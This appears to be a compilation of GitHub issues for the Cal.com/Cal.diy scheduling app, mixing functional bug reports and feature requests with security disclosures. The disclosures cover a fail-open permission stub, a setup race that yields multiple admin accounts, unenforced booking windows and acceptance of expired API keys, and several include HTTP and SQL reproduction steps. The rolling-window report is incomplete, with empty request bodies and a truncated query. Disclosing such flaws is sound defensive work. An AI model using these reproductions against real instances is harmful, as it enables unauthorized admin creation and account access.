attackerUserId = 42 | booking.teamId = 999 | organizer = 1
doesUserIdHaveAccessToBooking(attacker) => true
>>> VULNERABLE: unrelated user granted access to a TEAM booking (PBAC stub returned true)
```

Attacker user 42 is not the organizer (id 1), not a host, and not a member of team 999, yet access returns `true`; secure behavior is `false`.

Impact: on public-source self-hosted instances with PBAC enabled (default), any authenticated user gets cross-tenant booking/team access. CWE-862/863, ~8.5.

Suggested fix: ship/import the permission-check service; make the stub default deny (fail closed); add a CI guard against `checkPermission(){return true}`.

### Issue Summary

For a **ROUND_ROBIN** event type that has a **fixed (mandatory) host** alongside round-robin hosts, when the fixed host is fully busy for a time, the booking page still **offers slots** for that time based on the round-robin hosts alone. Booking one of those slots then **fails** at checkout with `FixedHostsUnavailableForBooking`. So bookers are shown available times that can never be booked (dead slots).

Root cause is in `packages/features/availability/lib/getAggregatedAvailability/getAggregatedAvailability.ts`. The fixed-host constraint is dropped whenever the fixed hosts' combined availability is empty:

```ts
const dateRangesToIntersect = fixedDateRanges.length ? [fixedDateRanges] : [];
```

`fixedDateRanges` is empty in **two** different situations — (a) there are no fixed hosts, and (b) fixed hosts exist but can't overlap (a mandatory host is busy). The `.length` check treats both as "no constraint," so in case (b) the aggregate is driven by the round-robin hosts alone.

This contradicts the booking layer's own rule: `RegularBookingService.ts` requires every fixed host to be available (`if (fixedUserPool.length !== users.filter(u => u.isFixed).length) throw FixedHostsUnavailableForBooking`). So the slot generator disagrees with the booking validator.

### Steps to Reproduce

1. Create a ROUND_ROBIN team event with at least one **fixed** host and one or more round-robin hosts.
2. Make the fixed host fully busy for a day (e.g. a blocking calendar event), while a round-robin host stays free.
3. Open the booking page for that day.

### Actual Results

- Slots are offered for times when the fixed host is busy. Attempting to book one fails with `FixedHostsUnavailableForBooking`.

### Expected Results

- No slots are offered when a mandatory fixed host is unavailable (consistent with COLLECTIVE events and with the booking-time validation).

### Technical details

- Backend logic bug, independent of browser/Node. Reproduces on current `main`.
- `getAggregatedAvailability.ts:45` conflates "no fixed hosts" with "fixed hosts unavailable." Scope: ROUND_ROBIN events with fixed host(s).

### Evidence

Reproduced with a unit test (the function is pure): a `ROUND_ROBIN` input with a busy fixed host + an available round-robin host returns the round-robin slot instead of `[]`. Verified failing before the fix, passing after; the existing 10 tests in the file and the broader availability/schedules suites (213 tests) are unaffected. A fix with this test is ready and will be linked shortly.

### Is your proposal related to a problem?

When a guest is marked as a no-show, cal.diy does nothing to recover the booking. For self-hosters running coaching, consulting, or paid service pages, every no-show is lost revenue — and re-engaging that guest happens manually (or never). There's no built-in, opt-in way to automatically nudge a no-show guest to rebook.

### Describe the solution you'd like

A self-contained, opt-in **"No-show Recovery"** App Store integration. When a host marks a guest as a no-show, and the app is enabled on that event type, the app automatically emails the guest a friendly "sorry we missed you — rebook here" message containing the event type's public booking link, after a short configurable delay.

**Trigger (important):** hook the general **`BOOKING_NO_SHOW_UPDATED`** event (`packages/features/handleMarkNoShow.ts`, line 268), which already routes attendee no-show data to apps via `packages/features/noShow/handleSendingAttendeeNoShowDataToApps`. This covers all meeting types (phone, in-person, Zoom, Cal Video), unlike the Cal-Video-only `AFTER_GUESTS_CAL_VIDEO_NO_SHOW` path.

**Scope for v1 (deliberately small):**
- One trigger: attendee marked `noShow: true` on a booking whose event type has the app enabled.
- One action: send that guest exactly one rebook email (idempotent — flag stored in `booking.metadata`).
- One setting: enable/disable per event type (+ optional send delay, default 1h).
- Config in app settings / event-type `metadata` — no new core schema tables.

**Why it fits cal.diy:** opt-in App Store integration, doesn't touch core booking logic, reuses the existing no-show signal and the existing email sender (`@calcom/emails/email-manager`) — no new infrastructure. No Teams/Orgs/PBAC/Workflows dependency (Workflows were removed in migration `20260319000000_drop_workflow_tables`).

**Out of scope for v1:** host no-show handling, discount codes/incentives (that was #4782, closed as not planned), multi-step sequences, SMS, analytics/redemption dashboards, and any guest-facing UI beyond the email.

### Describe alternatives you've considered

- **Manual recovery** (host copies the guest's email and follows up by hand) — slow, easily forgotten, no consistency.
- **The perks/gift-card app (#4782)** — closed as *not planned*; this proposal is narrower and behavior-focused (recovery), not incentives.
- **Host-initiated rebook** (#21838, #14873) — those are host-side actions from the bookings page; this is an *automated, guest-facing* email, which does not exist today.
- **Cal-Video no-show trigger** — rejected because it only fires for Cal Video meetings; `BOOKING_NO_SHOW_UPDATED` covers all locations.

### Additional context

- Confirmed via `gh search` that no existing issue or PR covers a guest-facing no-show recovery email.
- Reuses existing infra: `handleMarkNoShow.ts` → `BOOKING_NO_SHOW_UPDATED`, the `handleSendingAttendeeNoShowDataToApps` app-routing point, and `@calcom/emails/email-manager`.
- Related: #4782 (perks — not planned), #21838 / #14873 (host-initiated rebook), PR #28898 (booking rating — separate).
- Happy to build this as a self-contained App Store PR (draft, <500 lines / <10 files) once approved — posting here first per the feature-request / `needs approval` process rather than opening a PR cold.

### Requirement/Document

**Acceptance criteria**
- [ ] App installable from the App Store; enable/disable + delay configurable per event type.
- [ ] Marking a guest no-show on an enabled event type sends exactly one recovery email with the correct rebook link.
- [ ] Disabled app / host-only no-show / already-sent → no email.
- [ ] All UI strings added to `packages/i18n/locales/en/common.json`.
- [ ] Unit tests for the trigger guard + idempotency; `TZ=UTC yarn test` passes.
- [ ] `yarn type-check:ci --force` and `yarn biome check` pass.
- [ ] Draft PR, <500 lines / <10 code files.

**Proposed technical approach**
- New app dir `packages/app-store/no-show-recovery/` with `config.json` (`"categories": ["automation"]`), scaffolded from a simple app (e.g. `dub`).
- Consume attendee no-show data via `handleSendingAttendeeNoShowDataToApps` (preferred, already app-facing) or a `BOOKING_NO_SHOW_UPDATED` webhook subscriber.
- Guard: attendee `noShow === true` AND app enabled for the event type AND `booking.metadata.noShowRecoverySentAt` unset.
- Build rebook URL from the event type; send via `@calcom/emails/email-manager`; persist the idempotency flag.
- All Prisma reads use `select`; services use `ErrorWithCode`; no `as any`.

After booking with a Cal.com host, there is no way to see a consolidated view of all unique clients (attendees) who have booked appointments. Hosts — especially service businesses (coaches, therapists, consultants, trainers) — need to quickly look up a client's full booking history, contact info, and total spend. This is a standard feature in competitor scheduling platforms like **Acuity Scheduling** (Client Management dashboard) and **Calendly** (Contact profile view).

### Current Behavior
- Booking data exists per-booking in the `Booking` and `Attendee` models
- There is no aggregated "client" view — hosts must manually search through individual bookings
- No way to see total bookings or total spend per unique attendee email

### Proposed Solution
Add a **Client Booking History Dashboard** that aggregates attendee data from a host's bookings into a client list with drill-down detail.

**Client List View** (`/bookings/clients`):
- Table of all unique clients (deduplicated by email) who have booked with the host
- Columns: Name, Email, Total Bookings, Total Spent, Last Booking Date, First Booking Date
- Search/filter by name or email
- Click on a client row to view their full booking history

**Client Detail View** (`/bookings/clients/[email]`):
- Client info header: name, email, total bookings, total spent
- Timeline/table of all bookings this client has made
- Each booking row: date, event type title, status, amount paid, booking UID (link to booking detail)

### Technical Approach (V1)
- **No new database model needed** — aggregate from existing `Attendee` ⟶ `Booking\> `Payment` relations
- New tRPC router: `viewer.clients.list` (all unique clients) and `viewer.clients.get` (single client history)
- New page under `/bookings/clients` with a sub-navigation tab
- Uses existing `Table` and `ShellMainAppDir` patterns from the codebase

### Out of Scope (V1)
- Client notes/private annotations (V2)
- Client tags/segmentation (V2)
- Email communication history (V2)
- Automatic client deduplication across teams (V2)

### Why This Matters
This is a top-3 reason service businesses choose Acuity over Cal.com. Adding a basic client view removes a major blocker for service-business adoption and brings Cal.com closer to feature parity with premium competitors — with no new database tables needed.

### References
- Acuity Scheduling: Client Management dashboard with booking history, notes, and intake forms
- Calendly: Contact profile with booking history

### Issue Summary

For a round-robin event type with recurrence enabled, syncing to a third-party calendar that creates recurring series (e.g. Google Calendar) incorrectly splits the booking into two separate recurring series.

The first occurrence (occurrence 0) is created in one recurring series, while occurrences 1..N are created in another. As a result, editing or deleting the recurring series from the calendar only affects occurrences 1..N, leaving the first occurrence orphaned.

The root cause is in RecurringBookingService. In the round-robin booking flow, the first occurrence is handled separately to determine the selected ("lucky") host. However, after creating that booking, the code propagates only luckyUsers and does not propagate the generated thirdPartyRecurringEventId. Consequently, the main booking loop starts with a null recurring event ID, causing the second occurrence to create a brand-new recurring series instead of attaching to the existing one.

The non-round-robin recurring booking flow already propagates thirdPartyRecurringEventId correctly and does not exhibit this issue.

### Steps to Reproduce

1. Create a **round-robin team event type** with **recurrence enabled**.

2. Connect the hosts to **Google Calendar**.

3. Book a recurring event with multiple occurrences.

4. Open the organizer's Google Calendar.

5. Observe the created recurring events.

**Why this is a bug**

All occurrences of a recurring booking should belong to the same recurring series. Splitting them into two independent series breaks expected calendar behavior, since edits made to "All events" only affect one of the series.

### Actual Results

* Occurrence `0` is created in one recurring series.

* Occurrences `1..N` are created in a separate recurring series.

* Editing or deleting the recurring series affects only occurrences `1..N`, while occurrence `0` remains unchanged.

### Expected Results

* All occurrences of the recurring booking should belong to a **single recurring series**.

* The `thirdPartyRecurringEventId` generated from the first booking should be reused for all subsequent occurrences.

* Editing or deleting the recurring series should correctly affect every occurrence.

### Technical details

* **Type:** Backend logic bug

* **Affected file:** `packages/features/bookings/lib/service/RecurringBookingService.ts`

* **Affected flow:** Round-robin + recurring bookings

* **Calendar provider:** Reproduced with Google Calendar (providers that create recurring series may also be affected)

### Evidence
Reproduced with a unit test (payment-free logic path, so no UI recording): a two-slot round-robin recurring booking where the first slot returns a thirdPartyRecurringEventId on its references — the second slot is invoked with thirdPartyRecurringEventId: null (should be the first slot's id). Verified failing before the fix, passing after. A fix with this test is ready

items.body: ## Description Duration abbreviations on event type cards and booking pages are misread by VoiceOver. Screen readers announce "30m" as "30 metres" and "1h" as "one age" instead of "30 minutes" and "1 hour". This creates a confusing experience for blind and low-vision users trying to choose between appointment lengths, and I imagine similar issues occur with other screen readers that expand single-letter abbreviations. ## Steps to reproduce 1. On macOS, turn on VoiceOver (Cmd + F5) using Safari. 2. Visit any Cal.com user's booking page with multiple event types of different durations (e.g. 30-minute and 60-minute options). 3. Navigate through the event type cards using the Rotor or arrow-key navigation. 4. Listen to how each event's duration is announced. ## Expected behaviour VoiceOver should announce each event's duration clearly and correctly, e.g. "30 minutes" or "1 hour". ## Actual behaviour VoiceOver announces "30 metres" (for 30m) and "one age" (for 1h), because "m" and "h" are being treated as standalone letters that VoiceOver expands to unrelated words. ## Environment - Screen reader: VoiceOver on macOS - Browser: Safari - Cal.com plan: Individual (free tier) - Both the free tier's default event types and paid events show the same behaviour. ## Suggested fix Two options: 1. **Use `aria-label`** on the duration element to explicitly spell it out, e.g. `30m`. The visible text can stay as an abbreviation, but the accessible name is expanded. 2. **Use the `` element with a `title`** attribute so screen readers can expand the abbreviation on demand. Less reliable across screen readers but better than the current state. Option 1 is more robust across screen readers. ## Impact This affects every blind or low-vision user choosing between appointment types by duration, which is a common decision point on booking pages. It's also a small but visible accessibility gap on a platform that many organisations choose specifically because of its accessibility positioning. ## Context I'm an accessibility and inclusion consultant, and I chose Cal.com over Acuity Scheduling for my consultancy website partly because Cal.com has a stronger accessibility reputation. I've currently worked around this by spelling out the duration in each event's description, but it would be great to see this fixed at the platform level. Happy to help with further testing if useful.

### Is your proposal related to a problem?
Yes. Currently `seatsPerTimeSlot` applies one single fixed value to every bookable slot generated by an event type. There's no way to set a different seat capacity for individual slots within the same day/event type.

### Describe the solution you'd like
Allow the seat capacity to be overridden on a per-slot basis, not just globally per event type. For example, within the same day:
- 10:00–11:00 → 2 seats
- 11:00–12:00 → 3 seats
- 12:00–13:00 → 1 seat
- 13:00–14:00 → 1 seat
- 15:00–16:00 → 3 seats

Each slot should be independently configurable, rather than inheriting one fixed value from the event type's default `seatsPerTimeSlot`. A sensible approach: keep `seatsPerTimeSlot` as the default value applied to all slots, but allow a per-slot override — similar to how some calendar tools let you override availability for a specific date/time without changing the recurring rule.

### Describe alternatives you've considered
- Creating separate event types per slot: not scalable — would require dozens of event types to represent a single day's varying capacity, fragmenting the booking page and duplicating all other configuration (workflows, reminders, forms).
- Fixed time-band overrides (e.g. morning vs afternoon): still too rigid — capacity can vary slot-by-slot based on real operational constraints (staff shift changes, resource availability, etc.), not just broad time-of-day bands.

### Additional context
Use case: multi-location retail business with 19 stores. In-store consultation slots need different, independently-set seat capacities per time slot depending on staff availability at that exact hour — which varies throughout the day in a way that doesn't map to fixed time bands.

Related to #18720 (seats capacity handling limitations) — that request addresses day-wide roll-over capacity, while this one is about setting an independent fixed capacity for each individual slot. Complementary use cases, same underlying limitation of the current seats system.

N/A

### Issue Summary

The initial setup endpoint (`POST /api/auth/setup`) is intended to create exactly one admin user on a fresh Cal.diy instance. However, when multiple requests arrive concurrently before any user exists, the "is this instance already set up?" check passes for all of them, and each request creates its own admin account.

We sent 5 simultaneous `POST /api/auth/setup` requests to a fresh instance, each with a different email and username. Expected at most 1 to succeed. Instead, multiple requests returned 200 — each creating an independent admin user. We verified at the database level that more than one user with `role = 'ADMIN'` exists.

Because each request uses a different email and username, there is no database-level unique constraint that would cause a conflict. The only protection is an application-level check ("is user count zero?"), which is subject to a TOCTOU gap during the password hashing step between the check and the insert.

### Steps to Reproduce

**Environment:**

- Cal.diy web app (`calcom/cal.com:latest`, port 3000)
- PostgreSQL 15 (database: `calendso`)
- Redis 7
- Env: `CALCOM_TELEMETRY_DISABLED=1`, `NODE_ENV=production`

**Setup:**

None beyond the default Prisma migrations that run on first boot. The database must have zero users — this is the precondition that makes the setup endpoint available.

The `/api/auth/setup` endpoint is unauthenticated by design.

**Control — single setup request:**

On a fresh instance with zero users:

```
POST /api/auth/setup HTTP/1.1
Host: calcom:3000
Content-Type: application/json

{
  "username": "admin1",
  "full_name": "Admin User One",
  "email_address": "admin1@dokkimi-test.com",
  "password": "TestPassword123!!"
}
```

Returns 200. Exactly one admin user is created. Subsequent requests return 400 "No setup needed."

**Bug — concurrent setup requests on a fresh instance:**

Send all 5 of the following requests simultaneously (not sequentially) to a fresh instance with zero users. Each request uses a different username, full_name, and email_address (admin1 through admin5), same password.

Multiple requests return 200. The race window exists because all requests check the user count before any of them complete the insert (password hashing introduces ~50ms of processing time between the check and the write).

**Database verification:**

```sql
SELECT count(*)::int AS admin_count
FROM "users"
WHERE role = 'ADMIN'
```

Returns `admin_count > 1`. In our tests, 2-4 of the 5 concurrent requests typically succeed depending on system timing.

**Reproducing with Dokkimi:**

[Dokkimi](https://dokkimi.com) is an open source testing tool that stands up isolated Docker environments from declarative YAML definitions — services, databases, seed data, test steps, and assertions all in one file. The definition for this bug is in [dokkimi/dokkimi-in-the-wild/.dokkimi/cal-diy](https://github.com/dokkimi/dokkimi-in-the-wild/tree/main/.dokkimi/cal-diy) — `dokkimi run` reproduces it from scratch.

### Actual Results

- Multiple concurrent requests to `/api/auth/setup` return 200, each creating an independent admin user
- The database contains multiple users with `role = 'ADMIN'` after the concurrent requests complete
- There is no indication in the UI that additional admin accounts were created

### Expected Results

- Exactly 1 request should succeed; the others should return 400
- The setup endpoint should use a database-level lock or unique constraint to prevent the TOCTOU race

### Technical details

- Self-hosted deployment via Docker
- PostgreSQL 15, Redis 7
- The race window is ~50ms (password hashing time between the user count check and the insert)
- Self-hosted instances are most vulnerable during initial deployment, but any instance redeployed with a fresh database (staging, CI, disaster recovery) reopens the window

### Evidence

Database query confirms `admin_count > 1` after concurrent requests. The Dokkimi test definition reproduces this end-to-end with 5 simultaneous requests.
items.title: Race condition in /api/auth/setup allows creating multiple admin users on a fresh instance

### Issue Summary

Event types configured with `periodType = ROLLING_WINDOW` and a short `periodDays` value (e.g., 2 days) can be booked arbitrarily far into the future via the `POST /api/book/event` endpoint. The frontend calendar correctly hides slots beyond the rolling window, but the server accepts any date submitted directly.

We created an event type with `periodType = 'rolling_window'` and `periodDays = 2`, then submitted a booking request for a slot 90 days in the future. Expected 400. Got 200 — the booking was accepted and persisted with `status = 'accepted'`.

For comparison, `ROLLING` (rolling number of calendar days) and `RANGE` (fixed date range) period types correctly reject out-of-bounds bookings server-side. Only `ROLLING_WINDOW` is affected.

### Steps to Reproduce

**Environment:**

- Cal.diy web app (`calcom/cal.com:latest`, port 3000)
- PostgreSQL 15 (database: `calendso`)
- Redis 7
- Env: `CALCOM_TELEMETRY_DISABLED=1`, `NODE_ENV=production`

**Setup:**

1. Create the initial admin user via `POST /api/auth/setup`
2. Seed a Schedule with all-day availability (days 0-6, 00:00-23:59), link to the user
3. Create an EventType with `periodType = 'rolling_window'`, `periodDays = 2`, `periodCountCalendarDays = true`, `length = 30`

The booking endpoint is unauthenticated (accepts bookings from guests).

**Control — booking within the allowed window:**

```

Host: calcom:3000
Content-Type: application/json

{

}
```

Returns 200. This date is within the next 2 bookable days.

**Bug — booking 90 days beyond the rolling window:**

```
POST /api/book/event HTTP/1.1

Content-Type: application/json

{

  "metadata": {},
```

Returns 200. The slot is ~90 days in the future — far beyond the 2-day rolling window.

**Database verification:**

```sql
FROM "Booking"
WHERE "eventTypeId" = 1
  AND "startTime" = '2026-10-01 14:00:00'
  AND status = 'accepted'
```

[Dokkimi](https://dokkimi.com) is an open source testing tool that stands up isolated Docker environments from declarative YAML definitions — services, databases, seed data, test steps, and assertions all in one file. - The booking is persisted in the database with `status = 'accepted'`
- The ROLLING_WINDOW period type provides no server-side restriction

### Expected Results

- The server should reject bookings outside the configured rolling window with 400 or 403
- ROLLING_WINDOW should be enforced server-side, consistent with how ROLLING and RANGE period types are enforced

### Issue Summary

API keys with an `expiresAt` timestamp that has already passed are still accepted by the API v2 authentication layer. The expiry comparison appears to use day-level granularity rather than exact timestamps, meaning a key that expired at midnight today (start of day) is treated as valid throughout the entire day.

We created a user, inserted an API key with `expiresAt` set to `CURRENT_DATE` (midnight at the start of today), verified at the database level that the key's `expiresAt` is in the past relative to `NOW()`, then called `GET /v2/me` using that key. Expected 401. Got 200 with the user's profile data.

Additionally, after the request completes, the `expiresAt` value stored on the key object has its time component zeroed to midnight, mutating the original expiry timestamp.

### Steps to Reproduce

**Environment:**

- Cal.diy API v2 (`calcom/api-v2:local`, port 5555)
- Cal.diy web app (`calcom/cal.com:latest`, port 3000)
- PostgreSQL 15 (database: `calendso`)
- Redis 7
- Env: `CALCOM_TELEMETRY_DISABLED=1`, `NODE_ENV=production`

**Setup:**

1. Create the initial admin user via `POST /api/auth/setup`
2. Insert an API key into the `ApiKey` table with `hashedKey` set to the SHA-256 hex of a known raw key string, and `expiresAt` set to `CURRENT_DATE` (midnight at the start of today)

**Control — health check:**

```
GET /health HTTP/1.1
Host: calcom-api:5555
```

Returns 200, confirming the API v2 server is running.

**Bug — expired API key accepted:**

Verify the key is expired:

```sql
SELECT id, "expiresAt", "expiresAt" < NOW() AS should_be_expired
FROM "ApiKey"
WHERE id = 'dokkimi_test_key_01'
```

Returns `should_be_expired = true`.

Authenticate with the expired key:

```
GET /v2/me HTTP/1.1
Host: calcom-api:5555
Authorization: Bearer cal_testkey123
```

Returns 200 with the user profile. The key is expired but accepted as valid.

**Reproducing with Dokkimi:**

[Dokkimi](https://dokkimi.com) is an open source testing tool that stands up isolated Docker environments from declarative YAML definitions — services, databases, seed data, test steps, and assertions all in one file. The definition for this bug is in [dokkimi/dokkimi-in-the-wild/.dokkimi/cal-diy](https://github.com/dokkimi/dokkimi-in-the-wild/tree/main/.dokkimi/cal-diy) — `dokkimi run` reproduces it from scratch.

### Actual Results

- The expired API key returns 200 with the user's profile data — authentication succeeds despite `expiresAt` being in the past
- API keys remain valid for up to 24 hours beyond their intended expiration
- The stored `expiresAt` timestamp has its time component zeroed to midnight after the auth check, mutating the original value

### Expected Results

- An API key whose `expiresAt` is before `NOW()` should return 401 Unauthorized
- The expiry comparison should use exact timestamp precision, not day-level granularity
- Revocation workflows that set a key's expiry to "now" or "earlier today" should take effect immediately

### Technical details

- Self-hosted deployment via Docker
- No SDK — raw HTTP requests via REST API
- PostgreSQL 15, Redis 7
- API v2 server (`calcom/api-v2:local`)
- The auth layer hashes the Bearer token and looks up the matching `hashedKey` in the `ApiKey` table

### Evidence

Database query confirms `expiresAt < NOW()` is true (key is expired), yet the API returns 200 with valid user data. The Dokkimi test definition reproduces this end-to-end from a clean environment.

### Issue Summary

The `/payment/[uid]` page never loads real data. Its server-side data loader was stubbed out during the Cal.diy refactor (`ab21c7f805`, #28903), so the page always renders hardcoded placeholder props instead of reading the payment by `uid` from the database.

In `apps/web/app/(use-page-wrapper)/payment/[uid]/page.tsx`:

```ts
const getData = withAppDirSsr<PaymentPageProps>(async () => ({
  props: {
    payment: { id: 0, success: false, refunded: false, amount: 0, currency: "usd", ... },
    booking: { id: 0, uid: "", title: "", startTime: "", endTime: "", ... },
    eventType: { id: 0, title: "", length: 0, price: 0, currency: "usd", metadata: null },
    ...
  },
}));
```

The `uid` route param is ignored entirely.

### Steps to Reproduce

1. Install any payment app (e.g. the mock payment app, PayPal, or Alby) and set a price on an event type
2. Book the event
3. You are redirected to `/payment/<uid>` (this is the standard redirect from `createPaymentLink` / the booking flow)
4. Look at the rendered payment page

### Actual Results

- The page shows an empty event title, `Invalid Date` for the date, and a `$0.00` / placeholder amount — regardless of the actual booking
- The payment app checkout components (PayPal / Alby / Hitpay / BTCPay) never mount, because `payment.appId` is always `null` — so the booker has no way to pay
- Any random `/payment/<garbage>` URL renders the same page instead of returning 404
- Cancelled/rejected bookings are no longer redirected to `/booking/[uid]`
- The page `<title>` metadata is always empty

### Expected Results

The page should load the payment row by `uid` (with its booking and event type), render the real event details and amount, mount the correct payment app component, return `notFound` for unknown uids, and redirect cancelled/rejected bookings to the booking page — as it did before the refactor (see `packages/features/ee/payments/pages/payment.tsx` at `a17f28e9ab`).

### Technical details

- The pre-refactor loader depended only on things that still exist in main: `paymentDataSelect` (`packages/prisma/selects/payment.ts`), `getServerSession`, `shouldHideBrandingForEvent`, `BookingStatus`, `EventTypeMetaDataSchema`
- Related observation: `apps/web/app/(use-page-wrapper)/payment/[uid]/PaymentPage.tsx` contains `{/* StripePaymentComponent removed */}`, so Stripe card checkout needs its component restored as well — that is arguably a separate issue/PR (this one is about the data loader that breaks *all* payment apps)
- This was also noticed in passing in #29664 ("the `/payment/[uid]` page's data loader was stubbed out during the big Cal.diy refactor")

I have a fix ready and will open a PR shortly.

## Issue Summary
When a booking is cancelled, the cancellation email's `.ics` attachment is generated with `METHOD:REQUEST` (and `STATUS:CANCELLED`) instead of `METHOD:CANCEL`. Per RFC 5546, only `METHOD:CANCEL` instructs a calendar client to remove an event. As a result the event stays in the attendee's calendar (Google/Outlook/Apple) and keeps firing reminders, even though the booking is cancelled.

This affects attendees who only receive the invite by email (no calendar connected in Cal.com) — i.e. the typical external booker.

## Root cause
`packages/emails/lib/generateIcsString.ts` hardcodes the method:

```ts
method: "REQUEST",
status,
```

`method` is `"REQUEST"` for every `BookingAction`, including cancellations; only the inner `status` changes to `CANCELLED`. The existing `BookingAction` enum (Create/Cancel/Reschedule/…) is not used to derive the ICS method. Confirmed identical on `v6.2.0` and current `main` (line ~110).

## Steps to reproduce
1. Create a booking with an attendee whose calendar is NOT connected in Cal.com (email invite only).
2. Import the invite into the attendee calendar (Google/Outlook/Apple).
3. Cancel the booking.
4. Observe: the cancellation `.ics` has `METHOD:REQUEST` + `STATUS:CANCELLED`; the event is NOT removed and reminders keep firing.

## Expected
Cancellation `.ics` uses `METHOD:CANCEL` (with a bumped `SEQUENCE`) so attendee calendars remove the event automatically.

## Notes
- Previously reported as CAL-1595 / #8513, closed as "completed" without a linked PR; the emailed `.ics` path is still affected. The earlier fix appears to have covered only directly-connected calendars (removed via the Calendar API), not the emailed `.ics`.
- Environment: self-hosted, official Docker release image (v6.2.0).
items.title: Cancellation emails send .ics with METHOD:REQUEST instead of METHOD:CANCEL → event stays in attendee calendars

### Issue Summary

Custom booking field placeholders are completely stripped from the first confirmation email sent to attendees. When a custom field (e.g. company) is added to an event type's booking fields and its placeholder (e.g. {company}) is used in the confirmation email subject or body, the placeholder silently disappears from the output — neither the placeholder syntax nor the submitted value appears in the received email. The issue is isolated to the initial booking confirmation email.

### Steps to Reproduce

1. Go to Event Types → select an event type
2. Add a custom booking field (type: text, identifier: company, label: "Company", marked as required)
3. Go to the Notifications / Emails tab of the same event type
4. Edit the first confirmation email subject to include {company} (e.g. Meeting with {company})
5. Save the event type
6. Book the event as an attendee, filling in a value for the Company field (e.g. "Acme Corp")
7. Check the confirmation email received by the attendee

### Actual Results

- The {company} placeholder is silently removed from the first confirmation email — the subject line renders as Meeting with with nothing after it
- The submitted value is correctly recorded in the booking dashboard, confirming the data is received server-side
- The template interpolation fails exclusively in the first confirmation email

### Expected Results

- The {company} placeholder should be replaced with the value entered by the attendee at booking time
- Expected subject: Meeting with Acme Corp

### Technical details

- Browser: Brave 1.91.178
- Cal.eu plan: Free
- Event type ID: 332018
- Custom field identifier: company
- Placeholder syntax attempted: {company}

### Evidence

- The booking dashboard correctly displays the submitted company name, confirming the value is captured server-side
items.title: Custom field placeholder silently stripped from first booking confirmation email

### Issue Summary

When an event type has more than one active webhook subscribed to the same Cal Video no-show trigger (`AFTER_HOSTS_CAL_VIDEO_NO_SHOW` or `AFTER_GUESTS_CAL_VIDEO_NO_SHOW`), only one subscriber's no-show webhook gets scheduled while the remaining subscribers are silently dropped.

On the booking-confirmation path, this collision can also prevent other scheduled webhooks for the booking from being created because task insertion conflicts are skipped.

### Steps to Reproduce

1. Create a Cal Video event type.
2. Create **two active webhooks** (different URLs) subscribed to the same no-show trigger (`AFTER_HOSTS_CAL_VIDEO_NO_SHOW` or `AFTER_GUESTS_CAL_VIDEO_NO_SHOW`).
3. Configure both webhooks with a `time` and `timeUnit`.
4. Create and confirm a booking for the event.
5. Inspect the scheduled tasks or wait for the webhook deliveries.

### Actual Results

* Only the first subscriber's no-show webhook task is scheduled.
* Remaining subscribers are silently skipped.
* On the booking-confirmation path, the collision can also interfere with scheduling other webhook tasks for the same booking.

### Expected Results

* Every active subscriber to the selected no-show trigger should receive its own independently scheduled webhook task.
* Scheduling one webhook must not prevent other webhook tasks for the same booking from being created.

### Technical details

* **Area:** No-show webhook scheduling in the booking flow and the Task tasker.
* **Environment:** Backend (not browser-specific).

### Evidence

* Reproduced the task-scheduling collision directly against PostgreSQL.
* Verified that when multiple tasks resolve to the same conflict target, only the first insert succeeds while subsequent webhook tasks are silently discarded.
items.title: No-show webhooks aren't all scheduled when an event type has multiple subscribers

### Is your proposal related to a problem?

Businesses that use Cal.com for scheduling still run their customer conversations (phone calls, voice notes, SMS, WhatsApp, web chat, email, and social DMs) in separate tools. Booking lives in one place and the conversation lives in another. To book, a customer has to be sent off to a booking link and complete it on their own, and staff jump between an inbox and the calendar. There is currently no Cal.com app that lets an AI agent check live availability and book, reschedule, or cancel directly inside the conversation, on the channel the customer is already using.

### Describe the solution you'd like

List Bold AI on the Cal.com App Store.

Bold AI is an AI customer-communication platform. A business connects its own Cal.com account through "Continue with Cal.com," and the AI agent then checks live availability and books, reschedules, and cancels appointments inside the conversation, across calls, voice notes, SMS, WhatsApp, web chat, email, Telegram, Facebook, and Instagram. Booking changes stay in sync through webhooks, so reminders and follow-ups fire automatically. No booking link hand-off, no switching tools, no missed leads.

### Describe alternatives you've considered

- Sending customers to a hosted Cal.com booking link: breaks the conversation and drops people mid-flow.
- Staff scheduling manually while reading the inbox: slow, error-prone, does not scale.
- Building our own scheduler: duplicates what Cal.com already does well. We would rather integrate with Cal.com directly.

None of these put real-time Cal.com booking inside an AI agent the way a native integration does.

### Additional context

The integration is already built. We connect via "Continue with Cal.com" using OAuth and register webhooks for two-way booking sync.

We have created an OAuth client (named "Bold AI"), currently showing as Pending verification. Website: https://boldai.io
